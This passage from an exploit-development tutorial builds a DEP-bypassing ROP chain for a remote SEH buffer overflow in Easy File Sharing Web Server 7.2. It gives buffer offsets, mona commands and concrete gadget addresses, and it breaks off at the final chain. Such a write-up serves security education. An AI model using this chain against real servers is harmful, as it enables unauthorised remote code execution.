<p>Now we just need to find out where exactly are we landing on our buffer after the pivot. I guess you could use the offset trick from before or just do some maths manually - turns out that we land exactly <strong>2455</strong> bytes into our buffer, let&rsquo;s keep that in mind and cater for that.</p>

<h2>ROP</h2>

<p>Alright, the most exciting part of the exploit development! <em>ROP ROP ROP your boat, gently down the stream&hellip;</em> :-)</p>

<p>Let&rsquo;s plan the attack! What we&rsquo;ll need to do is come up with a ROP chain that will disable DEP for us. Luckily, Windows already gives us 2 functions we can call (<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898%28v=vs.85%29.aspx">VirtualProtect</a> and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887%28v=vs.85%29.aspx">VirtualAlloc</a>) to achieve this.</p>

<p>They both take quite a few parameters, so, the main task will be to provide them reliably. In cases like this, there&rsquo;s also another neat trick that we can use - using <code>PUSHAD</code> opcode. What it does, it takes values from all of the registers and pushes them on the stack for us. If we can carefully put required values into apropraite registers and call <code>PUSHAD</code>, the registers will be pushed on the stack and, if we then call <code>VirtualProtect</code> function, the values from the stack will be taken as parameters to the function!</p>

<p>As long as we have right values in the right registers (i.e. providing them in a right order to <code>VirutalProtect</code>) it will execute the function correctly! After disabling DEP with ROP, we can simply put the our shellcode right after the ROP chain and it will be successfully executed from the stack.</p>

<p>Before we jump into more details, let&rsquo;s see how our buffer should look like now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Offsets</span>
</span><span class='line'><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>                              <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x1002280a</span><span class="p">)</span>          <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span>          <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once again, <code>mona</code> comes with great help for us - it can actually generate a ROP chain for us (or at least majority of it) making the task a bit simpler.</p>

<p>Run the program, trigger the crash, pass the execution to the program (it will crash again on incorrect EIP) and run <code>!mona modules</code> to find out what DLLs are loaded by the application and if there any restrictions on them.</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/mona_modules.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/mona_modules.png" alt="mona modules PNG" /></a></p>

<p>From the above, we can see that there&rsquo;s bunch of modules loaded, but the ones we are the most interested in, are the ones that are <strong>non-ASLR</strong> and <strong>not rebased</strong>.</p>

<p>It appears that there 2 modules like this <code>fsws.exe</code> and <code>sqlite3.dll</code> - we&rsquo;ll use them to find our ROP gadgets.</p>

<p>Also, a good thing is that they&rsquo;re both application DLLs (not system ones), meaning that they will always be loaded unchanged, regardless of the operating system flavour, hence, our exploit should be quite reliable and cross-platform (hopefully!).</p>

<p>With that in mind, we can now execute the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>!mona rop -m sqlite3.dll,fsws.exe -cpb '\x00\x3b'</span></code></pre></td></tr></table></div></figure>


<p>Where:</p>

<ul>
<li><strong>-m sqlite3.dll,fsws.exe</strong> specifies modules (<code>sqlite3.dll</code> and <code>fsws.exe</code>) in which we want to look for gadgets</li>
<li><strong>-cpb &lsquo;\x00\x3b&rsquo;</strong> ignores gadgets with addresses containing bad characters that would break our exploit</li>
</ul>


<p>Mona will generate bunch of files in it&rsquo;s logs directory:</p>

<ul>
<li><code>rop.txt</code> - containing list of various rop gadgets to use, categorised by the functionality</li>
<li><code>rop_suggestions.txt</code> - another list of various rop gadgets, generally more complex instructions</li>
<li><code>rop_chains.txt</code> - ready made ROP chains to disable DEP using <code>VirutalProtect</code> or <code>VirtualAlloc</code> functions</li>
</ul>


<p>Let&rsquo;s have a look at <code>rop_chains.txt</code> and see if there&rsquo;s something useful we could use:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">***</span> <span class="p">[</span> <span class="n">Python</span> <span class="p">]</span> <span class="o">***</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># rop chain generated with mona.py - www.corelan.be</span>
</span><span class='line'>    <span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>      <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c832d0</span><span class="p">,</span>  <span class="c"># ptr to &amp;VirtualProtect() [IAT sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x1002248c</span><span class="p">,</span>  <span class="c"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c18d81</span><span class="p">,</span>  <span class="c"># XCHG EAX,EDI # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x1001d626</span><span class="p">,</span>  <span class="c"># XOR ESI,ESI # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x10021a3e</span><span class="p">,</span>  <span class="c"># ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x10013ad6</span><span class="p">,</span>  <span class="c"># POP EBP # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c227fa</span><span class="p">,</span>  <span class="c"># &amp; push esp # ret  [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x00000000</span><span class="p">,</span>  <span class="c"># [-] Unable to find gadget to put 00000201 into ebx</span>
</span><span class='line'>      <span class="mh">0x10022c4c</span><span class="p">,</span>  <span class="c"># XOR EDX,EDX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x1001b4f6</span><span class="p">,</span>  <span class="c"># POP ECX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x100194b3</span><span class="p">,</span>  <span class="c"># POP EDI # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x1001a858</span><span class="p">,</span>  <span class="c"># RETN (ROP NOP) [ImageLoad.dll]</span>
</span><span class='line'>      <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c"># nop</span>
</span><span class='line'>      <span class="mh">0x100240c2</span><span class="p">,</span>  <span class="c"># PUSHAD # RETN [ImageLoad.dll] </span>
</span><span class='line'>    <span class="p">]</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rop_chain</span> <span class="o">=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Awesome, all hard work has been done for us! Well, not all of it actually - have a look at this line:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx</span></code></pre></td></tr></table></div></figure>


<p>Oops, mona found all but one gadget that we need for a successful ROP chain&hellip; but it&rsquo;s not the end of the world, let&rsquo;s find it ourselves! <em>And that&rsquo;s where the real fun begins.</em></p>

<p>Looking through all available gadgets that mona found, I really couldn&rsquo;t find anything simple that would put value of 201 to EBX. There were some <code>POP EBX</code> instructions available, but that was not very helpful. Why? 201 in hex contains <code>\x00</code>, which is a bad character and we can&rsquo;t use it!</p>

<p>I kept poking around and decided that I will probably need to put the value into EBX through some other register that I can easily populate with whatever value I want (specifically 201). I decided to focus on EAX.</p>

<p>With couple simple gadgets, I had 201 in EAX in no time:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>     <span class="c"># Generate value of 201 in EAX</span>
</span><span class='line'>    <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>    <span class="mh">0xFFFFFDFF</span><span class="p">,</span>  <span class="c"># Value of &#39;-201&#39;</span>
</span><span class='line'>    <span class="mh">0x100231d1</span><span class="p">,</span>  <span class="c"># NEG EAX # RETN [ImageLoad.dll]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Okay, how can I put it in the EBX now? Again, after a lot of searching, I couldn&rsquo;t find anything straight forward. Searched a bit more and stumbled across this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  0x1001da09:  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]</span></code></pre></td></tr></table></div></figure>


<p>Cool, so it will move EAX into EBX - exactly what I wanted! But it also does couple other things afterwards that may be problematic&hellip; let&rsquo;s look into it further.</p>

<p>In simple terms, what happens next is that we are saving the address of <code>ESP+C</code> (4th argument on the stack) into <code>EAX</code> and then, we increment the value pointed to by the address stored in <code>EAX</code>. This means that for it to work correctly, we need to have a writeable location in the memory so we can <code>INC</code> the value pointed by the address in <code>EAX</code>.</p>

<p>Luckily, looking at the generated part of the chain, mona already found it for us!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  0x61c73281,  # &Writable location [sqlite3.dll]</span></code></pre></td></tr></table></div></figure>


<p>Awesome, now we just need to do a bit of shuffling around with ESP to compensate for the first gadget and we should be fine! I ended up coming up with the following snippet:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>     <span class="c"># Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)</span>
</span><span class='line'>    <span class="mh">0x1001da09</span><span class="p">,</span>  <span class="c"># ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Other instructions to execute after above gadget - mona found those already...</span>
</span><span class='line'>    <span class="c"># (This is just to show that gadget above picks 4th next address to put into EAX)</span>
</span><span class='line'>    <span class="mh">0xDEADBEEF</span><span class="p">,</span>
</span><span class='line'>    <span class="mh">0xDEADBEEF</span><span class="p">,</span>
</span><span class='line'>    <span class="mh">0xDEADBEEF</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>    <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;Writable location [sqlite3.dll]    </span>
</span></code></pre></td></tr></table></div></figure>


<p>Also, last thing to remember is that the gadgets above will mess up our EAX register, which is a problem if we decide to insert them exactly where mona suggested. Why? Because one of the first things the suggested ROP chain does is that it sets EAX to an expected value. If we corrupt it later with our gadgets, call to <code>VirtualAlloc</code> won&rsquo;t have right arguments and the function will fail.</p>

<p>To overcome this, simply change the order and do our EBX magic as a first thing in the ROP chain. Setting up EAX will follow and we won&rsquo;t be corrupting anything.</p>

<p>Putting it all together, that&rsquo;s the final, working ROP chain:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
